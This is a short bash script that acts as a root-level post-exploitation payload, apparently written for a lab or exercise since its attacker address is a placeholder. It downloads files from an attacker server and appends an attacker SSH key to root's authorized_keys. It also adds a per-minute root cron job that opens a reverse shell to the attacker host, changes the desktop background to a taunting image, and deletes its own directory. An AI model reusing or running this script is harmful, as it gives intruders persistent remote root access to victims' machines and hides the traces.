#!/bin/bash
path=$1
cd $path

if [ "$EUID" -ne 0 ]
  then echo "Not root, exiting"
  exit
fi

# fetch password from server
curl "http://<REPLACE_IP>:10000/key" > $path/key.txt

# check for python or python3
if command -v python3 &> /dev/null
then
    python3 $path/analyser.py > test.txt
else
    python $path/analyser.py > test.txt
fi

touch /bin/updater

# SSH keys
mkdir -p /root/.ssh
chmod 700 /root/.ssh
touch /root/.ssh/authorized_keys
curl "http://<REPLACE_IP>:10000/ssh-key" | tr -d '"' >> /root/.ssh/authorized_keys

# deploy clipboard script
chown root:root $path/display.txt
chmod +x $path/deploy_clipboard.sh
./deploy_clipboard.sh

wget http://<REPLACE_IP>:10000/payloads/cyber-desktop-code-unlocked.png -O /usr/share/backgrounds/cyber-desktop-code-unlocked.png

export DISPLAY=":0"
user=$(cat user.txt)
export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(user)/bus"
# Ideally it'd have changed the background immediately like the user running it, but doesn't
gsettings set org.gnome.desktop.background picture-uri file:///usr/share/backgrounds/cyber-desktop-code-unlocked.png

# old code tried
# sudo -u $user dbus-launch --exit-with-session gsettings set org.gnome.desktop.background picture-uri file:///usr/share/backgrounds/cyber-desktop-code-unlocked.png    

echo "* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/<REPLACE_IP>/9001 0>&1'" >> /etc/crontab
chmod +x /bin/updater # forgot to do this once and oopsie

rm -rf $path